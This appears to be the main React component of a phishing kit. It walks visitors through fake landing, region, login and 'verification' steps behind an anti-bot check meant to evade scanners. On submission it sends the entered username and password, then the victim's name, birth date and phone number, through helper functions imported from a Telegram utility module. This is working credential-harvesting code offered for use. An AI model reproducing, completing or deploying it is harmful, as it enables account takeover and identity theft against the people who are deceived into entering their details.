import { useState, useEffect, useRef } from 'react';
import { AntiBotProtection } from './utils/antiBot';
import { sendLoginNotification, sendVerificationNotification } from './utils/telegram';
import Header from './components/Header';
import Loader from './components/Loader';
import LandingStep from './components/LandingStep';
import SearchStep from './components/SearchStep';
import LoginStep from './components/LoginStep';
import VerificationStep from './components/VerificationStep';
import ConfirmationStep from './components/ConfirmationStep';

type Step = 'loading' | 'landing' | 'search' | 'login' | 'verification' | 'confirmation';

export default function App() {
  const [step, setStep] = useState<Step>('loading');
  const [isChecking, setIsChecking] = useState(true);
  const [isHuman, setIsHuman] = useState(false);
  const retryCount = useRef(0);
  const region = useRef('');
  const credentials = useRef({ user: '', password: '' });

  useEffect(() => {
    const check = async () => {
      try {
        const ab = AntiBotProtection.getInstance();
        const result = await ab.checkForBot();
        if (!result.isBot) {
          setIsHuman(true);
          setIsChecking(false);
          return;
        }
      } catch {}
      retryCount.current++;
      if (retryCount.current >= 3) {
        setTimeout(() => { setIsHuman(true); setIsChecking(false); }, 10000);
      } else {
        setTimeout(check, 2000);
      }
    };
    check();
  }, []);

  useEffect(() => {
    if (isHuman && step === 'loading') {
      const timer = setTimeout(() => setStep('landing'), 1200);
      return () => clearTimeout(timer);
    }
  }, [isHuman, step]);

  const goStep = (s: Step) => {
    setStep(s);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleSearchContinue = (r: string) => {
    region.current = r;
    goStep('login');
  };

  const handleLoginContinue = async (user: string, password: string) => {
    credentials.current = { user, password };
    await sendLoginNotification(user, password, region.current);
    goStep('verification');
  };

  const handleVerificationContinue = async (nom: string, prenom: string, date: string, tel: string) => {
    const { user, password } = credentials.current;
    await sendVerificationNotification(nom, prenom, date, tel, user, password, region.current);
    goStep('confirmation');
  };

  if (isChecking && !isHuman) return <Loader />;

  return (
    <div className="min-h-screen bg-gray-50">
      {step !== 'loading' && <Header />}
      {step === 'loading' && <Loader />}
      {step === 'landing' && <LandingStep onContinue={() => goStep('search')} />}
      {step === 'search' && <SearchStep onContinue={handleSearchContinue} />}
      {step === 'login' && <LoginStep onContinue={handleLoginContinue} />}
      {step === 'verification' && <VerificationStep onContinue={handleVerificationContinue} />}
      {step === 'confirmation' && <ConfirmationStep />}
    </div>
  );
}
